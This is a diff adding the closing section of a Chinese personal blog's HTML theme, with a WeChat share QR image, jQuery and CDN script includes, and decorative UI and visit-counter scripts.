+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3aS27DMAwFwNz/0i7QbRL7kUyKWhqtAjdVNF4Q/OjxiNfxu54/nz95fp7snPxXc2FgYNyWcZyu/Ojnu7376zk+ORsGBsY+jDwUTo5YDd/J2TAwMDB6pDxNxMDAwPhGwM0P1wvQGBgYGJMidp4gTl7Wx2pxDAyMGzImg4Fvf/6j+QYGBsY/ZhzF1dutOgotnwoDA2NpxmQ82Rte5o288yePat8OAwPjtoxqYysJoNVgnbzEiycYGBgbMHoF5CTtS36rEPQxMDCWZuTJWf4z1aMnY9GoMYeBgbEBI7/gVU0Kk7ZaL+BiYGDswMjLxWoQ7DXUEvaLM2BgYGzDqF636hXAvVB7AcPAwNiAkYwe85FkXpr2XhYGBsbOjN52SQie/EpUAGNgYCzNKDffg1Rv/v3qKBQDA2NtxiQgJiljHiirTy4yXAwMjIUYefqVI3uBtTdUeOTbYWBg3JbRa4rlobbXaCtf/sDAwFiaUQ2+n71a0Qv30avBwMBYiNEMZ4MR5nxQ+jY1xMDAWJpRLUd7Y8hq7E8GFS8yXAwMjOUY1eKzetliUgCXi1sMDIxFGUdxVUNwNaBXh50YGBg7MKrN+rx8nTT3e609DAyMtRnVy155UTq5tFEef2JgYGzA6CVwvYSvdxXjoqjGwMDAGFyJmHcEo8YfBgYGRsDI08EqOPo+BgbGBow8gCaJ4OQCxzkmuuOGgYGxHGPSy5qUwdWdJwUwBgbGbRk/hVQi4C0jC70AAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2017/10/11");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "0xxk");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
